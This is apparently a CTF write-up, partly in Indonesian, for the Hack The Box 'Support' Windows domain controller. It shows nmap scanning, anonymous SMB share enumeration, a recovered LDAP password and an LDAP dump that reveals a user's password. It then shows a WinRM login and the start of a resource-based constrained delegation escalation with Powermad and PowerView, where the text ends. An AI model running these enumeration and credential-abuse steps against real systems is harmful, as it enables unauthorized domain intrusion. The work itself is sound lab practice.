---

---

**Nmap Result:**

```bash
┌─[aexon@parrot]─[~]
└──╼ $sudo nmap -sCV -p- 10.10.11.174 --min-rate 1000 -Pn
[sudo] password for aexon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 21:40 WIB
Nmap scan report for 10.10.11.174
Host is up (0.35s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-05 14:40:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -2m39s
| smb2-time: 
|   date: 2024-09-05T14:41:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.31 seconds
```

---

**SMB Enum:**


```bash
┌─[aexon@parrot]─[~]
└──╼ $netexec smb 10.10.11.174 -u 'anonymous' -p '' --shares
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\anonymous: 
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share
```

```bash
┌─[aexon@parrot]─[~]
└──╼ $netexec smb 10.10.11.174 -u 'anonymous' -p '' --shares -M spider_plus
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\anonymous: 
SPIDER_PLUS 10.10.11.174    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.174    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.174    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.174    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.174    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.174    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.174    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.10.11.174    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.11.174.json".
SPIDER_PLUS 10.10.11.174    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, support-tools, SYSVOL)
SPIDER_PLUS 10.10.11.174    445    DC               [*] SMB Readable Shares:  2 (IPC$, support-tools)
SPIDER_PLUS 10.10.11.174    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.174    445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.10.11.174    445    DC               [*] Total files found:    7
SPIDER_PLUS 10.10.11.174    445    DC               [*] File size average:    13.96 MB
SPIDER_PLUS 10.10.11.174    445    DC               [*] File size min:        77.32 KB
SPIDER_PLUS 10.10.11.174    445    DC               [*] File size max:        45.87 MB
```

di sini saya curiga dengan shares support-tools nya, mari kita cek.

hasil dari enum smb nya

```bash
┌─[aexon@parrot]─[~]
└──╼ $smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\aexon]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 00:01:06 2022
  ..                                  D        0  Sat May 28 18:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 18:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 18:19:55 2022
  putty.exe                           A  1273576  Sat May 28 18:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 18:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 00:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 18:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 18:19:43 2022

		4026367 blocks of size 4096. 968121 blocks available
smb: \> 
```

mari kita download UserInfo.exe.zip nya.


**Credents:**

ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

--- 
**Ldap ENUM:**



```bash
ldapdomaindump 'ldap://support.htb' -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

(enum) ┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/support/enum]
└──╼ $cat domain_users.json
```

```json
   "info": [
            "Ironside47pleasure40Watchful"
        ],
```

```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/support/enum]
└──╼ $netexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
WINRM       10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```



---

**Cara mendapatkan root flag**

Resource-Based Constrained Delegation


```powershell
Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\powermad.ps1
Evil-WinRM* PS C:\Users\support\Documents> import-module .\PowerView.ps1

```